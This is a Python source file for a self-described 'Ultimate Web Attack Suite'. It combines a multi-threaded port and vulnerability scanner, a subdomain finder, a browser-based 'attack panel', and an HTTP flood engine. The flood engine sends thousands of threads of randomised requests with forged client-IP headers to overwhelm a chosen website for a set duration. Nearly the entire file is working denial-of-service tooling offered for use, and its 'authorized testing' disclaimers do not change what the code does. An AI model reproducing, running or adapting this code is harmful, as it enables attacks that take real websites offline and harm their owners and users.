#!/usr/bin/env python3
# DDOS RYZV1 - Ultimate Web Attack Suite
# RYZDARK X-V7 | 07 Januari 2025
# Features: Port Scanner, Subdomain Finder, DDoS, Web Interface

import socket
import threading
import random
import time
import sys
import ssl
import urllib.parse
import requests
import json
import dns.resolver
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import warnings
warnings.filterwarnings("ignore")
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse as urlparse

class RYZV1Scanner:
    """Advanced Web-based Port and Vulnerability Scanner"""
    
    def __init__(self):
        self.common_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
            993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000,
            10000, 27017, 28015, 5432, 6379, 9200
        ]
        
        self.service_map = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'MSRPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS',
            995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP',
            5900: 'VNC', 8080: 'HTTP-ALT', 8443: 'HTTPS-ALT',
            8888: 'cPanel', 9000: 'PHP-FPM', 10000: 'Webmin',
            27017: 'MongoDB', 28015: 'RethinkDB', 5432: 'PostgreSQL',
            6379: 'Redis', 9200: 'Elasticsearch'
        }
        
    def scan_port(self, target, port, timeout=1):
        """Scan single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                service = self.get_service_info(target, port)
                return {
                    'port': port,
                    'status': 'OPEN',
                    'service': service.get('name', 'Unknown'),
                    'banner': service.get('banner', ''),
                    'vulnerable': self.check_vulnerabilities(port, service)
                }
        except:
            pass
        return None
    
    def get_service_info(self, target, port):
        """Get service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            
            if port == 80 or port == 8080:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                if 'Server:' in banner:
                    return {'name': 'HTTP', 'banner': banner[:500]}
                    
            elif port == 443 or port == 8443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                ssl_sock = context.wrap_socket(sock, server_hostname=target)
                cert = ssl_sock.getpeercert()
                return {'name': 'HTTPS', 'banner': str(cert)[:200]}
                
            elif port == 21:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return {'name': 'FTP', 'banner': banner}
                
            elif port == 22:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return {'name': 'SSH', 'banner': banner[:200]}
                
            elif port == 25:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return {'name': 'SMTP', 'banner': banner}
                
            elif port == 3306:
                return {'name': 'MySQL', 'banner': 'MySQL Detected'}
                
            sock.close()
        except:
            pass
        
        return {'name': self.service_map.get(port, 'Unknown'), 'banner': ''}
    
    def check_vulnerabilities(self, port, service):
        """Check for common vulnerabilities"""
        vulns = []
        
        # CVE checks based on port and service
        if port == 21 and 'vsFTPd' in service.get('banner', ''):
            vulns.append('CVE-2011-2523 (vsFTPd 2.3.4 Backdoor)')
            
        if port == 22 and 'OpenSSH' in service.get('banner', '') and '7.7' in service.get('banner', ''):
            vulns.append('CVE-2018-15473 (OpenSSH User Enumeration)')
            
        if port == 445:
            vulns.append('Potential SMB vulnerabilities (EternalBlue, etc)')
            
        if port == 3389:
            vulns.append('Potential RDP vulnerabilities (BlueKeep)')
            
        if port == 8080 and 'Apache' in service.get('banner', ''):
            vulns.append('Potential Apache Struts RCE')
            
        if port == 9000 and 'PHP' in service.get('banner', ''):
            vulns.append('Potential PHP-FPM RCE')
            
        if 'nginx' in service.get('banner', '').lower() and '1.18' in service.get('banner', ''):
            vulns.append('CVE-2021-23017 (nginx DNS resolver)')
            
        return vulns
    
    def find_subdomains(self, domain):
        """Find subdomains using common wordlist"""
        subdomains = []
        wordlist = [
            'www', 'mail', 'ftp', 'admin', 'webmail', 'server', 'ns1', 
            'ns2', 'smtp', 'pop', 'imap', 'blog', 'dev', 'test', 'staging',
            'api', 'secure', 'portal', 'cpanel', 'whm', 'webdisk', 'webhost',
            'panel', 'dns', 'vpn', 'm', 'mobile', 'old', 'new', 'beta',
            'alpha', 'shop', 'store', 'app', 'apps', 'support', 'help',
            'status', 'monitor', 'git', 'svn', 'blog', 'wiki', 'download',
            'upload', 'files', 'file', 'cdn', 'static', 'img', 'images',
            'video', 'videos', 'music', 'media'
        ]
        
        print(f"[SCANNER] Searching subdomains for {domain}")
        
        for sub in wordlist:
            target = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(target)
                subdomains.append({
                    'subdomain': target,
                    'ip': ip,
                    'status': 'RESOLVED'
                })
                print(f"  [+] Found: {target} -> {ip}")
            except:
                pass
        
        # Try DNS brute force
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1']
            
            common_records = ['A', 'AAAA', 'MX', 'TXT', 'NS']
            for record in common_records:
                try:
                    answers = resolver.resolve(domain, record)
                    for rdata in answers:
                        subdomains.append({
                            'subdomain': f'{record}.{domain}',
                            'data': str(rdata),
                            'type': record
                        })
                except:
                    pass
        except:
            pass
        
        return subdomains
    
    def full_scan(self, target):
        """Complete scan: ports, subdomains, info"""
        results = {
            'target': target,
            'ip_address': '',
            'ports': [],
            'subdomains': [],
            'vulnerabilities': [],
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Get IP
        try:
            ip = socket.gethostbyname(target)
            results['ip_address'] = ip
            print(f"[SCANNER] Target IP: {ip}")
        except:
            print("[SCANNER] Cannot resolve target")
            return results
        
        # Port Scan
        print(f"[SCANNER] Scanning {len(self.common_ports)} common ports...")
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(self.scan_port, ip, port): port for port in self.common_ports}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
                    if result['vulnerable']:
                        results['vulnerabilities'].extend(result['vulnerable'])
                    print(f"  [+] Port {result['port']} ({result['service']}) - OPEN")
        
        results['ports'] = sorted(open_ports, key=lambda x: x['port'])
        
        # Subdomain scan jika domain
        if '.' in target and not target.replace('.', '').isdigit():
            results['subdomains'] = self.find_subdomains(target)
        
        return results

class RYZV1WebInterface(BaseHTTPRequestHandler):
    """Web Interface for DDOS Control Panel"""
    
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        
        if parsed_path.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = self.get_dashboard()
            self.wfile.write(html.encode())
            
        elif parsed_path.path == '/scan':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            query = urlparse.parse_qs(parsed_path.query)
            target = query.get('target', [''])[0]
            
            if target:
                scanner = RYZV1Scanner()
                results = scanner.full_scan(target)
                self.wfile.write(json.dumps(results, indent=2).encode())
            else:
                self.wfile.write(json.dumps({'error': 'No target specified'}).encode())
                
        elif parsed_path.path == '/attack':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            query = urlparse.parse_qs(parsed_path.query)
            target = query.get('target', [''])[0]
            threads = int(query.get('threads', ['1000'])[0])
            duration = int(query.get('duration', ['30'])[0])
            
            if target:
                # Start attack in background thread
                attack_thread = threading.Thread(
                    target=self.start_attack_background,
                    args=(target, threads, duration)
                )
                attack_thread.daemon = True
                attack_thread.start()
                
                response = {
                    'status': 'attack_started',
                    'target': target,
                    'threads': threads,
                    'duration': duration,
                    'start_time': time.strftime('%Y-%m-%d %H:%M:%S')
                }
                self.wfile.write(json.dumps(response).encode())
            else:
                self.wfile.write(json.dumps({'error': 'No target specified'}).encode())
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def start_attack_background(self, target, threads, duration):
        """Start DDOS attack in background"""
        try:
            ddos = RYZV1DDOS(target, threads, duration, silent=True)
            ddos.start_attack()
        except Exception as e:
            print(f"[WEB] Attack error: {e}")
    
    def get_dashboard(self):
        """Generate HTML dashboard"""
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>RYZV1 Attack Panel</title>
            <style>
                body {{
                    background: #0a0a0a;
                    color: #00ff00;
                    font-family: 'Courier New', monospace;
                    margin: 0;
                    padding: 20px;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                }}
                .header {{
                    text-align: center;
                    padding: 20px;
                    border-bottom: 2px solid #00ff00;
                    margin-bottom: 30px;
                }}
                .header h1 {{
                    color: #ff0000;
                    text-shadow: 0 0 10px #ff0000;
                }}
                .panel {{
                    background: #111;
                    border: 1px solid #333;
                    border-radius: 5px;
                    padding: 20px;
                    margin-bottom: 20px;
                }}
                .panel-title {{
                    color: #ffff00;
                    border-bottom: 1px solid #333;
                    padding-bottom: 10px;
                    margin-bottom: 15px;
                }}
                input, select, button {{
                    background: #222;
                    color: #00ff00;
                    border: 1px solid #00ff00;
                    padding: 10px;
                    margin: 5px;
                    font-family: 'Courier New', monospace;
                }}
                button {{
                    cursor: pointer;
                    transition: 0.3s;
                }}
                button:hover {{
                    background: #00ff00;
                    color: #000;
                }}
                .results {{
                    background: #000;
                    border: 1px solid #444;
                    padding: 15px;
                    margin-top: 20px;
                    max-height: 400px;
                    overflow-y: auto;
                }}
                .port-open {{ color: #00ff00; }}
                .port-closed {{ color: #ff0000; }}
                .vulnerable {{ color: #ff4444; font-weight: bold; }}
                .status-active {{ color: #ffff00; animation: blink 1s infinite; }}
                @keyframes blink {{ 50% {{ opacity: 0.5; }} }}
                .grid {{
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 20px;
                }}
                @media (max-width: 768px) {{
                    .grid {{ grid-template-columns: 1fr; }}
                }}
            </style>
            <script>
                async function scanTarget() {{
                    const target = document.getElementById('scanTarget').value;
                    if (!target) return alert('Enter target');
                    
                    const resultsDiv = document.getElementById('scanResults');
                    resultsDiv.innerHTML = '<div class="status-active">Scanning... Please wait</div>';
                    
                    try {{
                        const response = await fetch(`/scan?target=${{encodeURIComponent(target)}}`);
                        const data = await response.json();
                        displayResults(data);
                    }} catch (error) {{
                        resultsDiv.innerHTML = `<div class="port-closed">Error: ${{error}}</div>`;
                    }}
                }}
                
                function displayResults(data) {{
                    let html = `<h3>Scan Results for ${{data.target}}</h3>`;
                    html += `<p>IP Address: ${{data.ip_address || 'Unknown'}}</p>`;
                    html += `<p>Scan Time: ${{data.scan_time}}</p>`;
                    
                    if (data.ports && data.ports.length > 0) {{
                        html += `<h4>Open Ports:</h4><ul>`;
                        data.ports.forEach(port => {{
                            html += `<li class="port-open">`;
                            html += `Port ${{port.port}} - ${{port.service}}`;
                            if (port.banner) html += `<br><small>${{port.banner.substring(0, 100)}}...</small>`;
                            if (port.vulnerable && port.vulnerable.length > 0) {{
                                html += `<br><span class="vulnerable">VULNERABLE: ${{port.vulnerable.join(', ')}}</span>`;
                            }}
                            html += `</li>`;
                        }});
                        html += `</ul>`;
                    }} else {{
                        html += `<p class="port-closed">No open ports found</p>`;
                    }}
                    
                    if (data.vulnerabilities && data.vulnerabilities.length > 0) {{
                        html += `<h4 class="vulnerable">Vulnerabilities Found:</h4><ul>`;
                        data.vulnerabilities.forEach(vuln => {{
                            html += `<li class="vulnerable">${{vuln}}</li>`;
                        }});
                        html += `</ul>`;
                    }}
                    
                    if (data.subdomains && data.subdomains.length > 0) {{
                        html += `<h4>Subdomains:</h4><ul>`;
                        data.subdomains.forEach(sub => {{
                            html += `<li>${{sub.subdomain}} - ${{sub.ip || sub.data || 'N/A'}}</li>`;
                        }});
                        html += `</ul>`;
                    }}
                    
                    document.getElementById('scanResults').innerHTML = html;
                }}
                
                async function startAttack() {{
                    const target = document.getElementById('attackTarget').value;
                    const threads = document.getElementById('threads').value;
                    const duration = document.getElementById('duration').value;
                    
                    if (!target) return alert('Enter target');
                    
                    document.getElementById('attackStatus').innerHTML = 
                        '<div class="status-active">Starting attack... Please wait</div>';
                    
                    try {{
                        const response = await fetch(
                            `/attack?target=${{encodeURIComponent(target)}}&threads=${{threads}}&duration=${{duration}}`
                        );
                        const data = await response.json();
                        
                        document.getElementById('attackStatus').innerHTML = 
                            `<div class="port-open">Attack STARTED against ${{data.target}}</div>
                             <p>Threads: ${{data.threads}}</p>
                             <p>Duration: ${{data.duration}} seconds</p>
                             <p>Started: ${{data.start_time}}</p>`;
                    }} catch (error) {{
                        document.getElementById('attackStatus').innerHTML = 
                            `<div class="port-closed">Attack failed: ${{error}}</div>`;
                    }}
                }}
                
                function autoFillTarget() {{
                    const scanTarget = document.getElementById('scanTarget').value;
                    document.getElementById('attackTarget').value = scanTarget;
                }}
            </script>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>⚡ RYZV1 ATTACK PANEL ⚡</h1>
                    <p>Advanced Port Scanner & DDoS Interface</p>
                    <p style="color: #ff4444; font-size: 12px;">FOR AUTHORIZED TESTING ONLY</p>
                </div>
                
                <div class="grid">
                    <div class="panel">
                        <div class="panel-title">🔍 PORT SCANNER</div>
                        <input type="text" id="scanTarget" placeholder="example.com or IP" style="width: 70%;">
                        <button onclick="scanTarget()">SCAN TARGET</button>
                        <button onclick="document.getElementById('scanTarget').value=''">CLEAR</button>
                        <p style="font-size: 12px; color: #888;">
                            Scans common ports, detects services, finds vulnerabilities
                        </p>
                        <div id="scanResults" class="results">
                            Results will appear here...
                        </div>
                    </div>
                    
                    <div class="panel">
                        <div class="panel-title">💣 DDoS ATTACK</div>
                        <input type="text" id="attackTarget" placeholder="http://target.com" style="width: 70%;">
                        <button onclick="autoFillTarget()">AUTO-FILL</button><br>
                        
                        <label>Threads:</label>
                        <select id="threads">
                            <option value="500">500</option>
                            <option value="1000" selected>1000</option>
                            <option value="2000">2000</option>
                            <option value="5000">5000</option>
                        </select>
                        
                        <label>Duration (seconds):</label>
                        <select id="duration">
                            <option value="30">30</option>
                            <option value="60" selected>60</option>
                            <option value="120">120</option>
                            <option value="300">300</option>
                        </select><br>
                        
                        <button onclick="startAttack()" style="background: #ff0000; color: white;">
                            🚀 LAUNCH ATTACK
                        </button>
                        <p style="font-size: 12px; color: #888;">
                            IP Spoofing enabled • Multi-technique • High bandwidth
                        </p>
                        <div id="attackStatus" class="results" style="min-height: 100px;">
                            Attack status will appear here...
                        </div>
                    </div>
                </div>
                
                <div class="panel">
                    <div class="panel-title">📊 SYSTEM STATUS</div>
                    <div id="systemStatus">
                        <p>Server Time: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                        <p>Scanner: <span class="port-open">READY</span></p>
                        <p>Attack Engine: <span class="port-open">READY</span></p>
                        <p>Web Interface: <span class="port-open">ACTIVE</span></p>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 40px; font-size: 10px; color: #555;">
                    RYZDARK X-V7 • {time.strftime('%Y-%m-%d %H:%M:%S')} • FOR EDUCATIONAL USE ONLY
                </div>
            </div>
        </body>
        </html>
        """
    
    def log_message(self, format, *args):
        """Disable default logging"""
        pass

class RYZV1DDOS:
    """DDOS Engine (Updated dengan lebih banyak features)"""
    
    def __init__(self, target_url, threads=2000, duration=60, silent=False):
        self.target_url = target_url
        self.parsed_url = urllib.parse.urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.path = self.parsed_url.path if self.parsed_url.path else '/'
        self.is_https = self.parsed_url.scheme == 'https'
        
        self.threads = threads
        self.duration = duration
        self.attack_active = True
        self.request_count = 0
        self.error_count = 0
        self.silent = silent
        
        # Enhanced User-Agent pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        if not self.silent:
            print(f"""
╔══════════════════════════════════════════════════════════╗
║               DDOS RYZV1 - INITIALIZED                  ║
╠══════════════════════════════════════════════════════════╣
║ Target    : {self.host:<45} ║
║ Port      : {self.port:<45} ║
║ Protocol  : {'HTTPS' if self.is_https else 'HTTP':<45} ║
║ Threads   : {self.threads:<45} ║
║ Duration  : {self.duration} seconds{' ':36}║
╚══════════════════════════════════════════════════════════╝
            """)
    
    def generate_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(3)
            
            sock.bind(('0.0.0.0', random.randint(1024, 65535)))
            
            if self.is_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except:
            return None
    
    def generate_payload(self):
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
        method = random.choice(methods)
        
        query = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 20)))
        
        attack_paths = [
            self.path,
            '/',
            '/index.php',
            '/wp-admin/admin-ajax.php',
            '/api/v1/users',
            '/admin/login',
            '/search',
            f'/images/{query}.jpg',
            f'/static/{query}.css',
            f'/js/{query}.js',
            '/.env',
            '/config.json',
            '/phpinfo.php',
            '/xmlrpc.php'
        ]
        
        selected_path = random.choice(attack_paths)
        
        headers = {
            'Host': self.host,
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close', 'Upgrade']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
            'Referer': f'https://www.google.com/search?q={query}',
            'X-Forwarded-For': self.generate_random_ip(),
            'X-Real-IP': self.generate_random_ip(),
            'CF-Connecting-IP': self.generate_random_ip(),
            'X-Client-IP': self.generate_random_ip(),
            'X-Forwarded-Host': self.host,
            'X-Requested-With': random.choice(['XMLHttpRequest', '']),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
            'Sec-Fetch-User': '?1'
        }
        
        if random.random() > 0.7:
            headers['Content-Type'] = 'application/json'
            post_data = json.dumps({'data': query, 'timestamp': int(time.time())})
            headers['Content-Length'] = str(len(post_data))
        elif method == 'POST':
            post_data = f'username={query}&password={query}&submit=login'
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Content-Length'] = str(len(post_data))
        else:
            post_data = ''
        
        request = f"{method} {selected_path}?{query}={random.randint(1000,9999)} HTTP/1.1\r\n"
        for key, value in headers.items():
            if value:
                request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        if post_data:
            request += post_data
        
        return request.encode('utf-8')
    
    def attack_thread(self, thread_id):
        sock = None
        last_reconnect = time.time()
        
        while self.attack_active and time.time() < self.start_time + self.duration:
            try:
                if sock is None or time.time() - last_reconnect > random.uniform(1, 3):
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
                    sock = self.create_socket()
                    if sock:
                        sock.connect((self.host, self.port))
                    last_reconnect = time.time()
                
                if sock:
                    for _ in range(random.randint(1, 5)):
                        payload = self.generate_payload()
                        sock.sendall(payload)
                        self.request_count += 1
                        
                        try:
                            sock.recv(512)
                        except:
                            pass
                        
                        if self.request_count % 100 == 0 and not self.silent:
                            self.show_stats()
                        
                        time.sleep(random.uniform(0.01, 0.1))
                        
            except Exception as e:
                self.error_count += 1
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                sock = None
                time.sleep(0.05)
        
        if sock:
            try:
                sock.close()
            except:
                pass
    
    def show_stats(self):
        elapsed = time.time() - self.start_time
        rps = self.request_count / elapsed if elapsed > 0 else 0
        
        sys.stdout.write(f"\r[RYZV1] Requests: {self.request_count:,} | "
                        f"Errors: {self.error_count:,} | "
                        f"RPS: {rps:.1f} | "
                        f"Threads: {threading.active_count()}")
        sys.stdout.flush()
    
    def start_attack(self):
        self.start_time = time.time()
        
        if not self.silent:
            print("[RYZV1] Launching attack threads...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for i in range(self.threads):
                executor.submit(self.attack_thread, i)
            
            while time.time() < self.start_time + self.duration:
                time.sleep(1)
            
            self.attack_active = False
        
        if not self.silent:
            elapsed = time.time() - self.start_time
            print(f"\n\n{'='*60}")
            print(f"ATTACK COMPLETED")
            print(f"{'='*60}")
            print(f"Total Requests: {self.request_count:,}")
            print(f"Total Errors: {self.error_count:,}")
            print(f"Duration: {elapsed:.2f}s")
            print(f"RPS: {self.request_count/elapsed:.1f}")
            print(f"{'='*60}")

def main():
    """Main entry point with web interface"""
    print("""
╔══════════════════════════════════════════════════════════╗
║               RYZV1 ULTIMATE SUITE v2.0                  ║
║               Created by RYZDARK X-V7                    ║
║               Updated: 07 Januari 2025                   ║
╠══════════════════════════════════════════════════════════╣
║ [1] Web Interface (Port Scanner + DDoS Panel)           ║
║ [2] Direct DDoS Attack                                  ║
║ [3] Port Scanner Only                                   ║
║ [4] Exit                                                ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    try:
        choice = input("[+] Select option (1-4): ").strip()
        
        if choice == '1':
            # Start web interface
            port = 8080
            server = HTTPServer(('0.0.0.0', port), RYZV1WebInterface)
            print(f"[+] Web interface started at http://localhost:{port}")
            print("[+] Press Ctrl+C to stop")
            server.serve_forever()
            
        elif choice == '2':
            # Direct DDoS attack
            target = input("[+] Target URL: ").strip()
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            threads = input("[+] Threads [2000]: ").strip()
            threads = int(threads) if threads else 2000
            
            duration = input("[+] Duration seconds [60]: ").strip()
            duration = int(duration) if duration else 60
            
            ddos = RYZV1DDOS(target, threads, duration)
            ddos.start_attack()
            
        elif choice == '3':
            # Port scanner only
            target = input("[+] Target (domain/IP): ").strip()
            scanner = RYZV1Scanner()
            results = scanner.full_scan(target)
            
            print(f"\n{'='*60}")
            print(f"SCAN RESULTS FOR: {results['target']}")
            print(f"IP Address: {results['ip_address']}")
            print(f"Scan Time: {results['scan_time']}")
            print(f"{'='*60}")
            
            if results['ports']:
                print(f"\nOPEN PORTS ({len(results['ports'])} found):")
                for port in results['ports']:
                    print(f"  Port {port['port']}: {port['service']}")
                    if port.get('banner'):
                        print(f"    Banner: {port['banner'][:100]}...")
                    if port.get('vulnerable'):
                        print(f"    ⚠️  Vulnerable: {', '.join(port['vulnerable'])}")
            else:
                print("\nNo open ports found")
            
            if results['vulnerabilities']:
                print(f"\nVULNERABILITIES FOUND:")
                for vuln in results['vulnerabilities']:
                    print(f"  ⚠️  {vuln}")
            
            if results['subdomains']:
                print(f"\nSUBDOMAINS ({len(results['subdomains'])} found):")
                for sub in results['subdomains'][:10]:
                    print(f"  {sub['subdomain']} -> {sub.get('ip', sub.get('data', 'N/A'))}")
            
            print(f"\n{'='*60}")
            
        elif choice == '4':
            print("[+] Exiting...")
            return
        
        else:
            print("[!] Invalid option")
            
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
